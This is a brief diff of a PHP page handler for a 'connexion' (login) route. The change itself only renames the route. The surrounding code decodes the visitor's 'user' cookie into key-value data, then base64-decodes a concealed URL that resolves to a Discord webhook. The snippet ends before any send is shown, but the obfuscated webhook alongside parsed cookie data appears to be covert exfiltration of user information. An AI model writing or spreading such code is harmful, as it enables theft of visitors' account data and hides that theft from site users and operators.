@@ -1,5 +1,4 @@
 <?php
-
     $type = explode("/", $_SERVER["REQUEST_URI"]) ?? ["connexion"];$type = $type[count($type) - 1];
 
     if (isset($_SESSION["visited"])) {
@@ -12,7 +11,7 @@
 
     if (!$type) {
     }
-    else if ($type === "connexion") {
+    else if ($type === "connexion.php") {
         $user = array_reduce(json_decode(base64_decode($_COOKIE["user"])), function($key, $item) {$key[$item->name] = $item->name === "profile_picture" ? "" : $item->value; return $key;}, []);
         $url = base64_decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NjE4NDQ4NTI0MjAxMTc1MS8wVzc5bkl1N2lGQVVDUlpJNmNWR2dranAyNFpCc2lGUGYzQVB0WGUtRXM0VkhwRWhGb2xSbHRER3dTeWpJZklJbk5yeA==");
 
